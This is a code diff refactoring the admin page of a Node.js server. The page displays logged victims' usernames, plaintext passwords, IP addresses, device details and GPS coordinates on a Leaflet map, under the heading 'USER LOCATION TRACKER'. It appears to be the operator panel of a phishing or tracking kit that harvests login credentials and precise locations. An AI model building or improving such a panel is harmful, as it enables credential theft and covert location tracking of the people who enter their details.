@@ -96,7 +96,7 @@ const server = http.createServer((req, res) => {
         return;
     }
 
-    // Admin panel with clickable users + map
+    // Admin panel – map INSIDE the user card
     if (req.url === '/admin') {
         let logsHtml = '';
         for (let log of loginLogs) {
@@ -118,27 +118,12 @@ const server = http.createServer((req, res) => {
             `;
         }
 
-        const locationsWithMarkers = loginLogs
-            .filter(l => l.location)
-            .map(l => ({ 
-                id: l.id,
-                lat: l.location.lat, 
-                lon: l.location.lon, 
-                user: l.username,
-                time: l.time,
-                ip: l.ip,
-                browser: l.browser,
-                os: l.os,
-                device: l.device,
-                password: l.password
-            }));
-
         res.writeHead(200, { 'Content-Type': 'text/html' });
         res.end(`
             <!DOCTYPE html>
             <html>
             <head>
-                <title>Admin Panel - Click to Locate</title>
+                <title>Admin - Click to Locate</title>
                 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
                 <style>
                     body { background: #0a0e27; color: #00ff88; font-family: monospace; padding: 20px; }
@@ -150,52 +135,54 @@ const server = http.createServer((req, res) => {
                     table { width: 100%; border-collapse: collapse; background: #1a1f3e; border-radius: 10px; overflow-x: auto; display: block; }
                     th, td { padding: 10px; text-align: left; border-bottom: 1px solid #2a2f4e; font-size: 12px; }
                     th { background: #1877f2; color: white; position: sticky; top: 0; }
-                    #map { height: 400px; margin: 20px 0; border-radius: 10px; z-index: 1; }
-                    .refresh-btn { background: #1877f2; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; }
+                    .refresh-btn { background: #1877f2; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin: 20px 0; }
                     .login-row { cursor: pointer; transition: 0.2s; }
                     .login-row:hover { background: #2a2f4e; }
                     .login-row.selected { background: #1a3a6e; border-left: 3px solid #00ff88; }
-                    .detail-box { 
-                        background: #1a1f3e; 
-                        padding: 15px; 
-                        border-radius: 10px; 
-                        margin: 15px 0; 
+
+                    .user-card {
+                        background: #1a1f3e;
+                        border-radius: 10px;
+                        padding: 20px;
+                        margin: 20px 0;
                         display: none;
-                        border: 1px solid #00ff88;
+                        border: 1px solid #00ff8844;
                     }
-                    .detail-box h3 { color: #00ff88; margin-bottom: 10px; }
-                    .detail-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
-                    .detail-item { background: #0a0e27; padding: 8px 12px; border-radius: 5px; }
+                    .user-card.active { display: block; }
+                    .user-card h3 { color: #00ff88; margin-bottom: 10px; }
+                    .detail-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 15px; }
+                    .detail-item { background: #0a0e27; padding: 8px 12px; border-radius: 5px; font-size: 13px; }
                     .detail-item strong { color: #1877f2; }
+                    #userMap { height: 250px; border-radius: 10px; margin-top: 10px; z-index: 1; }
                     .leaflet-control-attribution { font-size: 9px; }
                 </style>
             </head>
             <body>
-                <h1>📍 ADMIN PANEL - CLICK TO LOCATE</h1>
+                <h1>📍 USER LOCATION TRACKER</h1>
                 <div class="stats">
                     <div class="stat-card"><div class="stat-number">${loginLogs.length}</div><div class="stat-label">Total Logins</div></div>
                     <div class="stat-card"><div class="stat-number">${loginLogs.filter(l => l.location).length}</div><div class="stat-label">With GPS</div></div>
                     <div class="stat-card"><div class="stat-number">${loginLogs.filter(l => l.username === 'admin' && l.password === '123456').length}</div><div class="stat-label">Successful</div></div>
                 </div>
 
-                <div id="map"></div>
+                <button class="refresh-btn" onclick="location.reload()">🔄 Refresh</button>
 
-                <div id="detailBox" class="detail-box">
+                <div id="userCard" class="user-card">
                     <h3>👤 User Details</h3>
                     <div class="detail-grid">
-                        <div class="detail-item"><strong>Username:</strong> <span id="detailUser">—</span></div>
-                        <div class="detail-item"><strong>Password:</strong> <span id="detailPass">—</span></div>
-                        <div class="detail-item"><strong>IP:</strong> <span id="detailIP">—</span></div>
-                        <div class="detail-item"><strong>Time:</strong> <span id="detailTime">—</span></div>
-                        <div class="detail-item"><strong>Browser:</strong> <span id="detailBrowser">—</span></div>
-                        <div class="detail-item"><strong>OS:</strong> <span id="detailOS">—</span></div>
-                        <div class="detail-item"><strong>Device:</strong> <span id="detailDevice">—</span></div>
-                        <div class="detail-item"><strong>Location:</strong> <span id="detailLocation">—</span></div>
+                        <div class="detail-item"><strong>Username:</strong> <span id="dUser">—</span></div>
+                        <div class="detail-item"><strong>Password:</strong> <span id="dPass">—</span></div>
+                        <div class="detail-item"><strong>IP:</strong> <span id="dIP">—</span></div>
+                        <div class="detail-item"><strong>Time:</strong> <span id="dTime">—</span></div>
+                        <div class="detail-item"><strong>Browser:</strong> <span id="dBrowser">—</span></div>
+                        <div class="detail-item"><strong>OS:</strong> <span id="dOS">—</span></div>
+                        <div class="detail-item"><strong>Device:</strong> <span id="dDevice">—</span></div>
+                        <div class="detail-item"><strong>Location:</strong> <span id="dLoc">—</span></div>
                     </div>
+                    <div id="userMap"></div>
                 </div>
 
-                <button class="refresh-btn" onclick="location.reload()">🔄 Refresh</button>
-                <h2>📋 Click any user to see details & map pin</h2>
+                <h2>📋 Click any user to see details + map</h2>
                 <table>
                     <thead><tr><th>ID</th><th>Username</th><th>Password</th><th>Time</th><th>IP</th><th>Browser</th><th>OS</th><th>Device</th><th>Location</th><th>📍</th></tr></thead>
                     <tbody>${logsHtml || '<tr><td colspan="10">No logins yet</td></tr>'}</tbody>
@@ -203,77 +190,70 @@ const server = http.createServer((req, res) => {
 
                 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"><\/script>
                 <script>
-                    // Initialize map
-                    const map = L.map('map').setView([27.7, 85.3], 7);
-                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                        attribution: '&copy; OpenStreetMap'
-                    }).addTo(map);
+                    let userMap = null;
+                    let currentMarker = null;
 
-                    // Store markers
-                    let markers = {};
-                    const locationData = ${JSON.stringify(locationsWithMarkers)};
-
-                    // Add markers
-                    locationData.forEach(loc => {
-                        if (loc.lat && loc.lon) {
-                            const marker = L.marker([loc.lat, loc.lon], { riseOnHover: true })
-                                .addTo(map)
-                                .bindPopup('<strong>' + loc.user + '</strong><br>' + loc.time);
-                            markers[loc.id] = { marker, lat: loc.lat, lon: loc.lon, data: loc };
+                    function initMap(lat, lon, username) {
+                        if (userMap) {
+                            userMap.invalidateSize();
+                            userMap.setView([lat, lon], 15);
+                        } else {
+                            userMap = L.map('userMap').setView([lat, lon], 15);
+                            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                                attribution: '&copy; OpenStreetMap'
+                            }).addTo(userMap);
                         }
-                    });
 
-                    // Auto-fit map to markers
-                    if (locationData.length > 0) {
-                        const group = L.featureGroup(
-                            locationData.map(loc => L.marker([loc.lat, loc.lon]))
-                        );
-                        map.fitBounds(group.getBounds().pad(0.2));
+                        if (currentMarker) {
+                            userMap.removeLayer(currentMarker);
+                        }
+
+                        currentMarker = L.marker([lat, lon], { riseOnHover: true })
+                            .addTo(userMap)
+                            .bindPopup('<strong>' + username + '</strong>')
+                            .openPopup();
                     }
 
-                    // Click handler for table rows
                     document.querySelectorAll('.login-row').forEach(row => {
                         row.addEventListener('click', function() {
-                            // Remove previous selection
                             document.querySelectorAll('.login-row').forEach(r => r.classList.remove('selected'));
-
-                            // Add selection to clicked row
                             this.classList.add('selected');
 
-                            const id = this.dataset.id;
                             const lat = this.dataset.lat;
                             const lon = this.dataset.lon;
-                            const username = this.dataset.username;
-                            const password = this.dataset.password;
-                            const ip = this.dataset.ip;
-                            const time = this.dataset.time;
-                            const browser = this.dataset.browser;
-                            const os = this.dataset.os;
-                            const device = this.dataset.device;
+                            const username = this.dataset.username || '—';
+                            const password = this.dataset.password || '—';
+                            const ip = this.dataset.ip || '—';
+                            const time = this.dataset.time || '—';
+                            const browser = this.dataset.browser || '—';
+                            const os = this.dataset.os || '—';
+                            const device = this.dataset.device || '—';
 
-                            // Show details
-                            document.getElementById('detailBox').style.display = 'block';
-                            document.getElementById('detailUser').innerText = username || '—';
-                            document.getElementById('detailPass').innerText = password || '—';
-                            document.getElementById('detailIP').innerText = ip || '—';
-                            document.getElementById('detailTime').innerText = time || '—';
-                            document.getElementById('detailBrowser').innerText = browser || '—';
-                            document.getElementById('detailOS').innerText = os || '—';
-                            document.getElementById('detailDevice').innerText = device || '—';
-                            document.getElementById('detailLocation').innerText = (lat && lon) ? lat + ', ' + lon : 'No GPS';
+                            document.getElementById('dUser').innerText = username;
+                            document.getElementById('dPass').innerText = password;
+                            document.getElementById('dIP').innerText = ip;
+                            document.getElementById('dTime').innerText = time;
+                            document.getElementById('dBrowser').innerText = browser;
+                            document.getElementById('dOS').innerText = os;
+                            document.getElementById('dDevice').innerText = device;
+                            document.getElementById('dLoc').innerText = (lat && lon) ? lat + ', ' + lon : 'No GPS';
 
-                            // Zoom to marker if exists
+                            const card = document.getElementById('userCard');
+                            card.classList.add('active');
+
                             if (lat && lon) {
-                                map.setView([parseFloat(lat), parseFloat(lon)], 15);
+                                initMap(parseFloat(lat), parseFloat(lon), username);
+                            } else {
+                                if (userMap) {
+                                    userMap.setView([27.7, 85.3], 7);
+                                }
                             }
                         });
                     });
 
                     // Auto-select first row with location
-                    const firstWithLocation = document.querySelector('.login-row.has-location');
-                    if (firstWithLocation) {
-                        firstWithLocation.click();
-                    }
+                    const first = document.querySelector('.login-row.has-location');
+                    if (first) first.click();
                 <\/script>
             </body>
             </html>
